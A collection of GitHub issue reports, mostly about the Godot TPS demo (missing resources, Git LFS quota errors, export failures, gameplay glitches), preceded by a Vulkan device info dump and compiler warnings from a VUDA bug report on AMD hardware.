	maxDescriptorSetUpdateAfterBindUniformBuffersDynamic = 8
	maxDescriptorSetUpdateAfterBindStorageBuffers        = 4294967295
	maxDescriptorSetUpdateAfterBindStorageBuffersDynamic = 8
	maxDescriptorSetUpdateAfterBindSampledImages         = 4294967295
	maxDescriptorSetUpdateAfterBindStorageImages         = 4294967295
	maxDescriptorSetUpdateAfterBindInputAttachments      = 4294967295

VkPhysicalDeviceDriverPropertiesKHR:
------------------------------------
	driverID           = DRIVER_ID_AMD_OPEN_SOURCE_KHR
	driverName         = AMD open-source driver
	driverInfo         = 
	conformanceVersion = 1.1.2.3

VkPhysicalDeviceExternalMemoryHostPropertiesEXT:
------------------------------------------------
	minImportedHostPointerAlignment = 0x00001000

VkPhysicalDeviceIDProperties:
-----------------------------
	deviceUUID      =  0000-10-00-00-000000
	driverUUID      = 414d442d-4c49-4e55-582d-445256000
	deviceNodeMask  = 1
	deviceLUIDValid = false

VkPhysicalDeviceInlineUniformBlockPropertiesEXT:
------------------------------------------------
	maxInlineUniformBlockSize                               = 65536
	maxPerStageDescriptorInlineUniformBlocks                = 16
	maxPerStageDescriptorUpdateAfterBindInlineUniformBlocks = 16
	maxDescriptorSetInlineUniformBlocks                     = 16
	maxDescriptorSetUpdateAfterBindInlineUniformBlocks      = 16

VkPhysicalDeviceLineRasterizationPropertiesEXT:
-----------------------------------------------
	lineSubPixelPrecisionBits = 4

VkPhysicalDeviceMaintenance3Properties:
---------------------------------------
	maxPerSetDescriptors    = 4294967295
	maxMemoryAllocationSize = 0x80000000

VkPhysicalDeviceMultiviewProperties:
------------------------------------
	maxMultiviewViewCount     = 6
	maxMultiviewInstanceIndex = 4294967295

VkPhysicalDevicePCIBusInfoPropertiesEXT:
----------------------------------------
	pciDomain   = 0
	pciBus      = 0
	pciDevice   = 1
	pciFunction = 0

VkPhysicalDevicePointClippingProperties:
----------------------------------------
	pointClippingBehavior = POINT_CLIPPING_BEHAVIOR_ALL_CLIP_PLANES

VkPhysicalDeviceProtectedMemoryProperties:
------------------------------------------
	protectedNoFault = false

VkPhysicalDeviceSampleLocationsPropertiesEXT:
---------------------------------------------
	sampleLocationSampleCounts:
		SAMPLE_COUNT_2_BIT
		SAMPLE_COUNT_4_BIT
		SAMPLE_COUNT_8_BIT
	maxSampleLocationGridSize:
		width  = 2
		height = 2
	sampleLocationCoordinateRange: count = 2
		0
		1
	sampleLocationSubPixelBits       = 4
	variableSampleLocations          = true

VkPhysicalDeviceSamplerFilterMinmaxPropertiesEXT:
-------------------------------------------------
	filterMinmaxSingleComponentFormats = true
	filterMinmaxImageComponentMapping  = false

VkPhysicalDeviceSubgroupProperties:
-----------------------------------
	subgroupSize              = 64
	supportedStages:
		SHADER_STAGE_VERTEX_BIT
		SHADER_STAGE_TESSELLATION_CONTROL_BIT
		SHADER_STAGE_TESSELLATION_EVALUATION_BIT
		SHADER_STAGE_GEOMETRY_BIT
		SHADER_STAGE_FRAGMENT_BIT
		SHADER_STAGE_COMPUTE_BIT
		SHADER_STAGE_ALL_GRAPHICS
		SHADER_STAGE_ALL
	supportedOperations:
		SUBGROUP_FEATURE_BASIC_BIT
		SUBGROUP_FEATURE_VOTE_BIT
		SUBGROUP_FEATURE_ARITHMETIC_BIT
		SUBGROUP_FEATURE_BALLOT_BIT
		SUBGROUP_FEATURE_SHUFFLE_BIT
		SUBGROUP_FEATURE_SHUFFLE_RELATIVE_BIT
		SUBGROUP_FEATURE_QUAD_BIT
	quadOperationsInAllStages = true

VkPhysicalDeviceSubgroupSizeControlPropertiesEXT:
-------------------------------------------------
	minSubgroupSize              = 64
	maxSubgroupSize              = 64
	maxComputeWorkgroupSubgroups = 4294967295
	requiredSubgroupSizeStages:
		None

VkPhysicalDeviceTransformFeedbackPropertiesEXT:
-----------------------------------------------
	maxTransformFeedbackStreams                = 4
	maxTransformFeedbackBuffers                = 4
	maxTransformFeedbackBufferSize             = 0xffffffff
	maxTransformFeedbackStreamDataSize         = 512
	maxTransformFeedbackBufferDataSize         = 512
	maxTransformFeedbackBufferDataStride       = 512
	transformFeedbackQueries                   = true
	transformFeedbackStreamsLinesTriangles     = true
	transformFeedbackRasterizationStreamSelect = false
	transformFeedbackDraw                      = true

VkPhysicalDeviceVertexAttributeDivisorPropertiesEXT:
----------------------------------------------------
	maxVertexAttribDivisor = 4294967295


Device Extensions: count = 77
	VK_AMD_buffer_marker                    : extension revision 1
	VK_AMD_draw_indirect_count              : extension revision 2
	VK_AMD_gcn_shader                       : extension revision 1
	VK_AMD_gpa_interface                    : extension revision 1
	VK_AMD_memory_overallocation_behavior   : extension revision 1
	VK_AMD_mixed_attachment_samples         : extension revision 1
	VK_AMD_negative_viewport_height         : extension revision 1
	VK_AMD_shader_ballot                    : extension revision 1
	VK_AMD_shader_core_properties           : extension revision 2
	VK_AMD_shader_core_properties2          : extension revision 1
	VK_AMD_shader_explicit_vertex_parameter : extension revision 1
	VK_AMD_shader_fragment_mask             : extension revision 1
	VK_AMD_shader_image_load_store_lod      : extension revision 1
	VK_AMD_shader_info                      : extension revision 1
	VK_AMD_shader_trinary_minmax            : extension revision 1
	VK_AMD_texture_gather_bias_lod          : extension revision 1
	VK_EXT_calibrated_timestamps            : extension revision 1
	VK_EXT_depth_clip_enable                : extension revision 1
	VK_EXT_depth_range_unrestricted         : extension revision 1
	VK_EXT_descriptor_indexing              : extension revision 2
	VK_EXT_external_memory_host             : extension revision 1
	VK_EXT_global_priority                  : extension revision 2
	VK_EXT_hdr_metadata                     : extension revision 2
	VK_EXT_host_query_reset                 : extension revision 1
	VK_EXT_inline_uniform_block             : extension revision 1
	VK_EXT_line_rasterization               : extension revision 1
	VK_EXT_memory_budget                    : extension revision 1
	VK_EXT_memory_priority                  : extension revision 1
	VK_EXT_pci_bus_info                     : extension revision 2
	VK_EXT_queue_family_foreign             : extension revision 1
	VK_EXT_sample_locations                 : extension revision 1
	VK_EXT_sampler_filter_minmax            : extension revision 2
	VK_EXT_scalar_block_layout              : extension revision 1
	VK_EXT_separate_stencil_usage           : extension revision 1
	VK_EXT_shader_stencil_export            : extension revision 1
	VK_EXT_shader_subgroup_ballot           : extension revision 1
	VK_EXT_shader_subgroup_vote             : extension revision 1
	VK_EXT_shader_viewport_index_layer      : extension revision 1
	VK_EXT_subgroup_size_control            : extension revision 2
	VK_EXT_transform_feedback               : extension revision 1
	VK_EXT_vertex_attribute_divisor         : extension revision 3
	VK_GOOGLE_decorate_string               : extension revision 1
	VK_GOOGLE_hlsl_functionality1           : extension revision 1
	VK_KHR_16bit_storage                    : extension revision 1
	VK_KHR_8bit_storage                     : extension revision 1
	VK_KHR_bind_memory2                     : extension revision 1
	VK_KHR_create_renderpass2               : extension revision 1
	VK_KHR_dedicated_allocation             : extension revision 3
	VK_KHR_depth_stencil_resolve            : extension revision 1
	VK_KHR_descriptor_update_template       : extension revision 1
	VK_KHR_device_group                     : extension revision 4
	VK_KHR_draw_indirect_count              : extension revision 1
	VK_KHR_driver_properties                : extension revision 1
	VK_KHR_external_fence                   : extension revision 1
	VK_KHR_external_fence_fd                : extension revision 1
	VK_KHR_external_memory                  : extension revision 1
	VK_KHR_external_memory_fd               : extension revision 1
	VK_KHR_external_semaphore               : extension revision 1
	VK_KHR_external_semaphore_fd            : extension revision 1
	VK_KHR_get_memory_requirements2         : extension revision 1
	VK_KHR_image_format_list                : extension revision 1
	VK_KHR_imageless_framebuffer            : extension revision 1
	VK_KHR_maintenance1                     : extension revision 2
	VK_KHR_maintenance2                     : extension revision 1
	VK_KHR_maintenance3                     : extension revision 1
	VK_KHR_multiview                        : extension revision 1
	VK_KHR_relaxed_block_layout             : extension revision 1
	VK_KHR_sampler_mirror_clamp_to_edge     : extension revision 3
	VK_KHR_shader_atomic_int64              : extension revision 1
	VK_KHR_shader_draw_parameters           : extension revision 1
	VK_KHR_shader_float16_int8              : extension revision 1
	VK_KHR_storage_buffer_storage_class     : extension revision 1
	VK_KHR_swapchain                        : extension revision 70
	VK_KHR_swapchain_mutable_format         : extension revision 1
	VK_KHR_uniform_buffer_standard_layout   : extension revision 1
	VK_KHR_variable_pointers                : extension revision 1
	VK_KHR_vulkan_memory_model              : extension revision 3

VkQueueFamilyProperties[0]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 1
	queueFlags                  = QUEUE_GRAPHICS | QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[1]:
==========================
	minImageTransferGranularity = (1, 1, 1)
	queueCount                  = 4
	queueFlags                  = QUEUE_COMPUTE | QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkQueueFamilyProperties[2]:
==========================
	minImageTransferGranularity = (8, 8, 8)
	queueCount                  = 2
	queueFlags                  = QUEUE_TRANSFER | QUEUE_SPARSE_BINDING
	timestampValidBits          = 64
	present support:
		VK_KHR_xcb_surface  = true
		VK_KHR_xlib_surface = true

VkPhysicalDeviceMemoryProperties:
=================================
memoryHeaps: count = 2
	memoryHeaps[0]:
		size   = 3221225472 (0xc0000000) (3.00 GiB)
		budget = 3060164096
		usage  = 0
		flags:
			None
	memoryHeaps[1]:
		size   = 1073741824 (0x40000000) (1024.00 MiB)
		budget = 1020054720
		usage  = 0
		flags:
			MEMORY_HEAP_DEVICE_LOCAL_BIT
			MEMORY_HEAP_MULTI_INSTANCE_BIT
memoryTypes: count = 4
	memoryTypes[0]:
		heapIndex     = 1
		propertyFlags = 0x0001:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[1]:
		heapIndex     = 0
		propertyFlags = 0x0006:
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[2]:
		heapIndex     = 1
		propertyFlags = 0x0007:
			MEMORY_PROPERTY_DEVICE_LOCAL_BIT
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images
	memoryTypes[3]:
		heapIndex     = 0
		propertyFlags = 0x000e:
			MEMORY_PROPERTY_HOST_VISIBLE_BIT
			MEMORY_PROPERTY_HOST_COHERENT_BIT
			MEMORY_PROPERTY_HOST_CACHED_BIT
		usable for:
			IMAGE_TILING_OPTIMAL: color images, FORMAT_D16_UNORM, FORMAT_D32_SFLOAT, FORMAT_S8_UINT, FORMAT_D16_UNORM_S8_UINT, FORMAT_D32_SFLOAT_S8_UINT
			IMAGE_TILING_LINEAR: color images

VkPhysicalDeviceFeatures:
=========================
	robustBufferAccess                      = true
	fullDrawIndexUint32                     = true
	imageCubeArray                          = true
	independentBlend                        = true
	geometryShader                          = true
	tessellationShader                      = true
	sampleRateShading                       = true
	dualSrcBlend                            = true
	logicOp                                 = true
	multiDrawIndirect                       = true
	drawIndirectFirstInstance               = true
	depthClamp                              = true
	depthBiasClamp                          = true
	fillModeNonSolid                        = true
	depthBounds                             = true
	wideLines                               = true
	largePoints                             = true
	alphaToOne                              = false
	multiViewport                           = true
	samplerAnisotropy                       = true
	textureCompressionETC2                  = false
	textureCompressionASTC_LDR              = false
	textureCompressionBC                    = true
	occlusionQueryPrecise                   = true
	pipelineStatisticsQuery                 = true
	vertexPipelineStoresAndAtomics          = true
	fragmentStoresAndAtomics                = true
	shaderTessellationAndGeometryPointSize  = true
	shaderImageGatherExtended               = true
	shaderStorageImageExtendedFormats       = true
	shaderStorageImageMultisample           = true
	shaderStorageImageReadWithoutFormat     = true
	shaderStorageImageWriteWithoutFormat    = true
	shaderUniformBufferArrayDynamicIndexing = true
	shaderSampledImageArrayDynamicIndexing  = true
	shaderStorageBufferArrayDynamicIndexing = true
	shaderStorageImageArrayDynamicIndexing  = true
	shaderClipDistance                      = true
	shaderCullDistance                      = true
	shaderFloat64                           = true
	shaderInt64                             = true
	shaderInt16                             = false
	shaderResourceResidency                 = true
	shaderResourceMinLod                    = true
	sparseBinding                           = true
	sparseResidencyBuffer                   = true
	sparseResidencyImage2D                  = true
	sparseResidencyImage3D                  = true
	sparseResidency2Samples                 = false
	sparseResidency4Samples                 = false
	sparseResidency8Samples                 = false
	sparseResidency16Samples                = false
	sparseResidencyAliased                  = true
	variableMultisampleRate                 = true
	inheritedQueries                        = true

VkPhysicalDevice16BitStorageFeatures:
-------------------------------------
	storageBuffer16BitAccess           = true
	uniformAndStorageBuffer16BitAccess = true
	storagePushConstant16              = false
	storageInputOutput16               = false

VkPhysicalDevice8BitStorageFeaturesKHR:
---------------------------------------
	storageBuffer8BitAccess           = true
	uniformAndStorageBuffer8BitAccess = true
	storagePushConstant8              = false

VkPhysicalDeviceDepthClipEnableFeaturesEXT:
-------------------------------------------
	depthClipEnable = true

VkPhysicalDeviceDescriptorIndexingFeaturesEXT:
----------------------------------------------
	shaderInputAttachmentArrayDynamicIndexing          = false
	shaderUniformTexelBufferArrayDynamicIndexing       = true
	shaderStorageTexelBufferArrayDynamicIndexing       = true
	shaderUniformBufferArrayNonUniformIndexing         = true
	shaderSampledImageArrayNonUniformIndexing          = true
	shaderStorageBufferArrayNonUniformIndexing         = true
	shaderStorageImageArrayNonUniformIndexing          = true
	shaderInputAttachmentArrayNonUniformIndexing       = false
	shaderUniformTexelBufferArrayNonUniformIndexing    = true
	shaderStorageTexelBufferArrayNonUniformIndexing    = true
	descriptorBindingUniformBufferUpdateAfterBind      = true
	descriptorBindingSampledImageUpdateAfterBind       = true
	descriptorBindingStorageImageUpdateAfterBind       = true
	descriptorBindingStorageBufferUpdateAfterBind      = true
	descriptorBindingUniformTexelBufferUpdateAfterBind = true
	descriptorBindingStorageTexelBufferUpdateAfterBind = true
	descriptorBindingUpdateUnusedWhilePending          = true
	descriptorBindingPartiallyBound                    = true
	descriptorBindingVariableDescriptorCount           = true
	runtimeDescriptorArray                             = true

VkPhysicalDeviceHostQueryResetFeaturesEXT:
------------------------------------------
	hostQueryReset = true

VkPhysicalDeviceImagelessFramebufferFeaturesKHR:
------------------------------------------------
	imagelessFramebuffer = true

VkPhysicalDeviceInlineUniformBlockFeaturesEXT:
----------------------------------------------
	inlineUniformBlock                                 = true
	descriptorBindingInlineUniformBlockUpdateAfterBind = true

VkPhysicalDeviceLineRasterizationFeaturesEXT:
---------------------------------------------
	rectangularLines         = false
	bresenhamLines           = true
	smoothLines              = false
	stippledRectangularLines = false
	stippledBresenhamLines   = true
	stippledSmoothLines      = false

VkPhysicalDeviceMemoryPriorityFeaturesEXT:
------------------------------------------
	memoryPriority = true

VkPhysicalDeviceMultiviewFeatures:
----------------------------------
	multiview                   = true
	multiviewGeometryShader     = false
	multiviewTessellationShader = true

VkPhysicalDeviceProtectedMemoryFeatures:
----------------------------------------
	protectedMemory = false

VkPhysicalDeviceSamplerYcbcrConversionFeatures:
-----------------------------------------------
	samplerYcbcrConversion = false

VkPhysicalDeviceScalarBlockLayoutFeaturesEXT:
---------------------------------------------
	scalarBlockLayout = true

VkPhysicalDeviceShaderAtomicInt64FeaturesKHR:
---------------------------------------------
	shaderBufferInt64Atomics = true
	shaderSharedInt64Atomics = true

VkPhysicalDeviceShaderDrawParametersFeatures:
---------------------------------------------
	shaderDrawParameters = true

VkPhysicalDeviceShaderFloat16Int8FeaturesKHR:
---------------------------------------------
	shaderFloat16 = false
	shaderInt8    = true

VkPhysicalDeviceSubgroupSizeControlFeaturesEXT:
-----------------------------------------------
	subgroupSizeControl  = true
	computeFullSubgroups = false

VkPhysicalDeviceTransformFeedbackFeaturesEXT:
---------------------------------------------
	transformFeedback = true
	geometryStreams   = true

VkPhysicalDeviceUniformBufferStandardLayoutFeaturesKHR:
-------------------------------------------------------
	uniformBufferStandardLayout = true

VkPhysicalDeviceVariablePointersFeatures:
-----------------------------------------
	variablePointersStorageBuffer = true
	variablePointers              = true

VkPhysicalDeviceVertexAttributeDivisorFeaturesEXT:
--------------------------------------------------
	vertexAttributeInstanceRateDivisor     = true
	vertexAttributeInstanceRateZeroDivisor = false

VkPhysicalDeviceVulkanMemoryModelFeaturesKHR:
---------------------------------------------
	vulkanMemoryModel                             = true
	vulkanMemoryModelDeviceScope                  = true
	vulkanMemoryModelAvailabilityVisibilityChains = false
```
And here is my hardware info:

```
00:01.0 VGA compatible controller: Advanced Micro Devices, Inc. [AMD/ATI] Mullins [Radeon R4/R5 Graphics] (rev 40) (prog-if 00 [VGA controller])
	Subsystem: Toshiba America Info Systems Mullins [Radeon R4/R5 Graphics]
	Flags: bus master, fast devsel, latency 0, IRQ 31
	Memory at e0000000 (64-bit, prefetchable) [size=256M]
	Memory at f0000000 (64-bit, prefetchable) [size=8M]
	I/O ports at 4000 [size=256]
	Memory at f0d00000 (32-bit, non-prefetchable) [size=256K]
	Expansion ROM at 000c0000 [disabled] [size=128K]
	Capabilities: [48] Vendor Specific Information: Len=08 <?>
	Capabilities: [50] Power Management version 3
	Capabilities: [58] Express Root Complex Integrated Endpoint, MSI 00
	Capabilities: [a0] MSI: Enable+ Count=1/1 Maskable- 64bit+
	Capabilities: [100] Vendor Specific Information: ID=0001 Rev=1 Len=010 <?>
	Capabilities: [270] Secondary PCI Express <?>
	Capabilities: [2b0] Address Translation Service (ATS)
	Capabilities: [2c0] Page Request Interface (PRI)
	Capabilities: [2d0] Process Address Space ID (PASID)
	Kernel driver in use: amdgpu
	Kernel modules: radeon, amdgpu
```

My OS is Arch Linux with kernel `linux-5.3.8-arch1-1`. I get this problem using both `RADV` (part of Mesa project) and `amdvlk` (AMDVLK Open, maintained by AMD). Just for reference, I can run [Sascha Willems' Vulkan examples](https://github.com/SaschaWillems/Vulkan) without any issue.

Thanks in advance!

 When compilating VUDA (GCC 9.2.0) the following warnings appear:

```
/usr/bin/ld: CMakeFiles/vuda-reduction.dir/main.cpp.o: in function `vuda::detail::get_errno[abi:cxx11]()':
main.cpp:(.text._ZN4vuda6detail9get_errnoB5cxx11Ev[_ZN4vuda6detail9get_errnoB5cxx11Ev]+0x52): warning: `sys_errlist' is deprecated; use `strerror' or `strerror_r' instead
/usr/bin/ld: main.cpp:(.text._ZN4vuda6detail9get_errnoB5cxx11Ev[_ZN4vuda6detail9get_errnoB5cxx11Ev]+0x36): warning: `sys_nerr' is deprecated; use `strerror' or `strerror_r' instead
```
I've read there's no trivial fix for this because `strerror` and `strerror_r` are not fork safe so I don't know what is the best way to fix this in VUDA.
<---------->
151948405
I have the following problem:
```
$ godot --version
3.1.1.stable.openSUSE

$ godot-runner project.godot 
OpenGL ES 3.0 Renderer: AMD CAICOS (DRM 2.50.0 / 5.1.10-1-default, LLVM 8.0.0)
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:996.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: poll: res://menu/menu.tscn:5 - Parse Error: [ext_resource] referenced nonexistent resource at: res://player/player.dae
   At: scene/resources/resource_format_text.cpp:440.
ERROR: load: Condition ' err != OK ' is true. returned: RES()
   At: core/io/resource_loader.cpp:208.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: start: Condition ' !scene ' is true. returned: false
   At: main/main.cpp:1739.
WARNING: cleanup: ObjectDB Instances still exist!
   At: core/object.cpp:2095.
ERROR: clear: Resources Still in use at Exit!
   At: core/resource.cpp:425.
``` When running the `master` or `download` branches (completely unmodified, no local changes) the screen is cropped to a vertically-oriented section. This is occurring on a 4k monitor which may be a factor. However, changing the monitor resolution to 1920x1080 has no effect. I also tried tweaking display resolution and orientation settings to no avail.

![image](https://user-images.githubusercontent.com/18314366/69689967-30923280-107f-11ea-8f82-6391642f5eee.png) I have the following problem:
```
$ godot --version
3.1.1.stable.openSUSE

$ godot-runner project.godot 
OpenGL ES 3.0 Renderer: AMD CAICOS (DRM 2.50.0 / 5.1.10-1-default, LLVM 8.0.0)
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:996.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: poll: res://menu/menu.tscn:5 - Parse Error: [ext_resource] referenced nonexistent resource at: res://player/player.dae
   At: scene/resources/resource_format_text.cpp:440.
ERROR: load: Condition ' err != OK ' is true. returned: RES()
   At: core/io/resource_loader.cpp:208.
ERROR: _load: Method/Function Failed, returning: RES()
   At: core/io/resource_loader.cpp:285.
ERROR: start: Condition ' !scene ' is true. returned: false
   At: main/main.cpp:1739.
WARNING: cleanup: ObjectDB Instances still exist!
   At: core/object.cpp:2095.
ERROR: clear: Resources Still in use at Exit!
   At: core/resource.cpp:425.
``` Good for you to know all the git commands, but not everyone is using git every day.
My git usage is limited to using GitHub Desktop to upload the repository and update it.
If people have to use git command lines to download this project then write instructions on commands letter by letter as it has to be written, not just faint hint for those who know-how. Easy to jump over railings and fall forever. Additionally, if you approach orange blocks from where red robot is, they will cause you to have vertical momentum, basically assuring you will fall over rail and into world.  When interacting with a sloped object, input is ignored and the player can get stuck trying to "climb" the object - requiring a restart of the demo I cloned the repo but it fails to checkout the lfs files. If i try a `git fts fetch`, this is the result:

`git lfs fetch
fetch: Fetching reference refs/heads/master
batch response: This repository is over its data quota. Purchase more data packs to restore access.
error: failed to fetch some objects from 'https://github.com/godotengine/tps-demo.git/info/lfs'`

How can i solve this?
Thaanks If stand next to some object you can rotate camera into object. It should instead be pushed out. Once a robot is taken out, you can jump on top of it. Walking slightly will make it spin.
Vid here:
https://streamable.com/p549w Using 3.0.6 stable on Windows 10. Tried to export to .exe, and while I've ironed out a number of export bugs I've hit quite a strange roadblock. I keep getting this error:

ERROR: No loader found for resource: res://Sprites/Clicktostart.png
   At: core/io/resource_loader.cpp:186
ERROR: poll: res://title.tscn:4 - Parse Error: [ext_resource] referenced nonexistent resource at: res://Sprites/Clicktostart.png
   At: scene/resources/scene_format_text.cpp:439

"Sprites/" is a directory which doesn't exist, as it has been replaced by another. I think I know when this issue happened. I changed the location of the sprites to the new directory and did so outside the Godot editor, but then I also changed every button (the buttons in the game are the only thing that use any sort of external graphical elements) to reflect the new location of the sprites. I've double checked this and can confirm that every button's filepath has been updated correctly. Strangely, the old "Sprites/" folder still appears in the "recent" filepaths when selecting the sprites, and clicking it displays all the images inside. Clearly Godot still thinks this folder exists, despite the fact that it is nowhere to be found in the directory. Even though it works in the editor, nothing I can find in any of my code or anything in the editor should be referencing "Sprites/". So far, I've tried the following in trying to troubleshoot:

-Checking the .import files that correspond to each *.png for the correct filepath
-Clearing the sprite in the editor for the button that uses "Clicktostart.png" (and all the other buttons, just in case)
-Deleting the entire .import folder and all the *.import files and then reimporting everything
-Doing the above and restarting the editor in the process

I can't figure out what could possibly be referencing this directory. It's not anywhere in my code, so it must be a weird file somewhere. Strangely, it was stuck on a _different_ *.png file for a while, and when I deleted the entire .import folder it started getting stuck on "Clicktostart.png" instead which I haven't been able to fix the same way. Does anybody have any ideas on where else this could be coming from? Thanks in advance for the help and sorry if it's a silly mistake on my part. Maybe I just need to get a good night's sleep and think about with a clear mind in the morning.
  the demo can't load in godot 3.1, it is missing many files. some dea files are not complete.
[![QQ-20190314113511.png](https://i.postimg.cc/FFnZ4tx0/QQ-20190314113511.png)](https://postimg.cc/JtZJN2vh) I wanted to add a "Quit" button to the menu but the font used for the existing buttons and the the title is not present in the project. There is a font folder with a ttf file and a `button_font.res` in the project, but it's not the right font, apparently the font used in settings menu.

By the way, TextureButton isn't the best choice for a community project, difficult to add new button, must generate images with right size and also have the blur used for the hover effect. 
If someone can add the right font I can try to add Buttons with the font and find a way to get the blur effect with shader. Using 3.0.6 stable on Windows 10. Tried to export to .exe, and while I've ironed out a number of export bugs I've hit quite a strange roadblock. I keep getting this error:

ERROR: No loader found for resource: res://Sprites/Clicktostart.png
   At: core/io/resource_loader.cpp:186
ERROR: poll: res://title.tscn:4 - Parse Error: [ext_resource] referenced nonexistent resource at: res://Sprites/Clicktostart.png
   At: scene/resources/scene_format_text.cpp:439

"Sprites/" is a directory which doesn't exist, as it has been replaced by another. I think I know when this issue happened. I changed the location of the sprites to the new directory and did so outside the Godot editor, but then I also changed every button (the buttons in the game are the only thing that use any sort of external graphical elements) to reflect the new location of the sprites. I've double checked this and can confirm that every button's filepath has been updated correctly. Strangely, the old "Sprites/" folder still appears in the "recent" filepaths when selecting the sprites, and clicking it displays all the images inside. Clearly Godot still thinks this folder exists, despite the fact that it is nowhere to be found in the directory. Even though it works in the editor, nothing I can find in any of my code or anything in the editor should be referencing "Sprites/". So far, I've tried the following in trying to troubleshoot:

-Checking the .import files that correspond to each *.png for the correct filepath
-Clearing the sprite in the editor for the button that uses "Clicktostart.png" (and all the other buttons, just in case)
-Deleting the entire .import folder and all the *.import files and then reimporting everything
-Doing the above and restarting the editor in the process

I can't figure out what could possibly be referencing this directory. It's not anywhere in my code, so it must be a weird file somewhere. Strangely, it was stuck on a _different_ *.png file for a while, and when I deleted the entire .import folder it started getting stuck on "Clicktostart.png" instead which I haven't been able to fix the same way. Does anybody have any ideas on where else this could be coming from? Thanks in advance for the help and sorry if it's a silly mistake on my part. Maybe I just need to get a good night's sleep and think about with a clear mind in the morning.
    At: scene/resources/resource_format_text.cpp:440
ERROR: load: Condition ' err != OK ' is true. returned: RES()
   At: core/io/resource_loader.cpp:208
ERROR: Failed loading resource: res://level/level.tscn
   At: core/io/resource_loader.cpp:285
ERROR: load_interactive: Condition ' err != OK ' is true. returned: Ref<ResourceInteractiveLoader>()
   At: core/io/resource_format_binary.cpp:996
ERROR: Failed loading resource: res://.import/demolevel.dae-8f363302f37767653f5d7ca6e6ed7cd8.scn
   At: core/io/resource_loader.cpp:285
ERROR: Failed loading resource: res://level/geometry/demolevel.dae
   At: core/io/resource_loader.cpp:285
ERROR: poll: res://level/level.tscn:4 - Parse Error: [ext_resource] referenced nonexistent resource at: res://level/geometry/demolevel.dae When importing the TPS demo for the first time (`import/` deleted), I get those errors on godotengine/godot@36de6c1e:

![screenshot_20190227_145818](https://user-images.githubusercontent.com/4701338/53495366-1ef40e00-3aa0-11e9-803a-c75152f354cd.png) These have been seen on a GTX 660 as well as an RX Vega M. Tested on both windows and linux, with both latest build on hugo.pro as well as beta 3:
A: Missing left arm padding for player
B: Missing left leg padding for enemies
C: Particle effects are not visible for orb

A + B:
![peek 2019-02-04 22-40](https://user-images.githubusercontent.com/3120639/52206406-3b03f580-28ce-11e9-8d33-e66f17dbef6c.gif)

C:
![peek 2019-02-04 22-41](https://user-images.githubusercontent.com/3120639/52206418-435c3080-28ce-11e9-853f-02d34e6ffcca.gif)

 ```
OpenGL ES 3.0 Renderer: GeForce GTX 660/PCIe/SSE2
WARNING: _createGodotPhysicsCallback: The GodotPhysics 3D physics engine is deprecated and will be removed in Godot 3.2. You should use the Bullet physics engine instead (configurable in your project settings).
   At: servers/register_server_types.cpp:84.
ERROR: _initialize_and_check_api_hashes: Mono: Core API hash mismatch!
   At: modules/mono/mono_gd/gd_mono.cpp:334.
ERROR: _load_data: Condition ' !f ' is true. returned: ERR_CANT_OPEN
   At: scene/resources/texture.cpp:470.
ERROR: _load: Failed loading resource: res://.import/experiment.hdr-b8c588f778b1bbe816e1780c3767a773.stex
   At: core/io/resource_loader.cpp:192.
ERROR: _load: Failed loading resource: res://menu/experiment.hdr
   At: core/io/resource_loader.cpp:192.
ERROR: poll: res://menu/menu.tscn:4 - Parse Error: [ext_resource] referenced nonexistent resource at: res://menu/experiment.hdr
   At: scene/resources/scene_format_text.cpp:439.
ERROR: load: Condition ' err != OK ' is true. returned: RES()
   At: core/io/resource_loader.cpp:155.
ERROR: _load: Failed loading resource: res://menu/menu.tscn
   At: core/io/resource_loader.cpp:192.
ERROR: start: Failed loading scene: res://menu/menu.tscn
   At: main/main.cpp:1703.
debugger-agent: Unable to listen on 23
ERROR: ~List: Condition ' _first != __null ' is true.
   At: ./core/self_list.h:111.
ERROR: ~List: Condition ' _first != __null ' is true.
   At: ./core/self_list.h:111.
WARNING: cleanup: ObjectDB Instances still exist!
   At: core/object.cpp:2081.
ERROR: clear: Resources Still in use at Exit!
   At: core/resource.cpp:425.
slapin@slapin-pc:~/tps-demo$ ~/godot/bin/godot.x11.opt.tools.64 -e
OpenGL ES 3.0 Renderer: GeForce GTX 660/PCIe/SSE2
WARNING: _createGodotPhysicsCallback: The GodotPhysics 3D physics engine is deprecated and will be removed in Godot 3.2. You should use the Bullet physics engine instead (configurable in your project settings).
   At: servers/register_server_types.cpp:84.
